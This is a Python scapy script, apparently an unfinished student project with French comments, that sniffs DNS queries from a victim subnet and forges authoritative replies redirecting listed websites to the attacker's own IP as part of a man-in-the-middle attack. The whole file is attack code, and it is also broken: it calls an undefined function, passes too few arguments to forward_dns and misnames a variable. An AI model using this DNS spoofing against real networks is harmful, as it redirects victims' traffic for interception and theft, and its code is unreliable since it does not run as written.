from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
import sys
import os
import ipaddress
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'environment')))
from attack_status import ATTACK_STATUS
from websites import WEBSITES
from mac_management import *

def dns_sorting_start(pkt):
    websites = WEBSITES
    dns= ATTACK_STATUS['dns']
    victims = ATTACK_STATUS['victims']
    network = ipaddress.ip_network(victims, strict=False)



    if pkt.haslayer(IP) and pkt.haslayer(DNS): #check if there is an IP and DNS layer
        src_ip = pkt[IP].src 
        dst_ip = pkt[IP].dst
        dns_check(websites, dns, network, pkt, src_ip, dst_ip)
    #comportement sinon ?????

def dns_check(websites, dns, network, pkt, src_ip, dst_ip):

    if pkt[DNS].qr == 0 and src_ip in network and dst_ip == dns : #if it's a request we want to block the one from the victim to the dns server
        domain_name = pkt[DNS][DNSQR].qname.decode('utf-8')
        website = match_website(websites, domain_name)
        if website: #if there is a corresponding website in out data
            if src_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
                create_dns_after_response(website, dns, network, pkt, src_ip, dst_ip, domain_name)        
                return

    #SI C EST UNE REPONSE, ON FORWARD JUSTE ?
    #elif pkt[DNS].qr == 1 and src_ip == dns and dst_ip in network and match_website() : #if it's a response we want to block the one from the dns server to the victim
    #    if pkt[DNS].an : #check if there is a response
    #        domain_name = pkt[DNS].an.rrname.decode('utf-8')
    #        website = match_website(website, domain_name)
    #        if website: #if there is a corresponding website in out data
    #            if dst_ip not in website[4]: #if we didn't already colelcted the information for this IP on this website
    #                create_dns_response(website, dns, network, pkt, src_ip, dst_ip)
    #                return

    forward_dns(pkt) #if something is wrong, it will forward the package

def match_website(websites,domain_name):
    if websites :
        for website in websites:
            if len(website) > 1 and domain_name in website[1]:
                return website
    return False

def forward_dns(pkt, dst_IP):
    #A VERIFIER !!!
    pkt[IP].chksum = None  
    pkt[UDP].chksum = None  
    
    pkt[Ether].src = pkt[Ether].dst #we replace the sender MAC with our
    dst_MAC = get_MAC(dst_IP)#we replace the destination MAC by the real one 

    if dst_MAC:
        pkt[Ether].dst = dst_MAC
        sendp(pkt)
    else:
        print(f"Error: Unable to resolve MAC address for {dst_IP}")
        #SINON AFFICHER QU'IL Y A UN PB


def create_dns_response(website, dns, network, pkt, req_src_ip, req_dst_ip, domain_name):
    #we just need to switch everything and add the response with our mavelous IP
    iface = str(ATTACK_STATUS['iface'])
    spoofer_IP = get_if_addr(iface)


    fake_ether = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) #MAC
    fake_IP = IP(src=pkt[IP].dst, dst=pkt[IP].src) 
    fake_UDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    fake_DNS = DNS(
        id=pkt[DNS].id, #same id
        qr=1, #it's a reponse
        aa=1, #it's an Authoritarian response
        qd=pkt[DNS].qd, #we capy the request
        an=DNSRR(rrname=domain_name,ttl=10,rdata=spoofer_IP)
    )

    fake_dns_response = fake_ether/fake_IP/fake_UDP/fake_dns
    sendp(fake_dns_response, verbose=False)


#def create_dns_after_response(website, dns, network, pkt, src_ip, dst_ip):
    #euuuuuuuh en vrai jsp, on bloque juste nan ? 
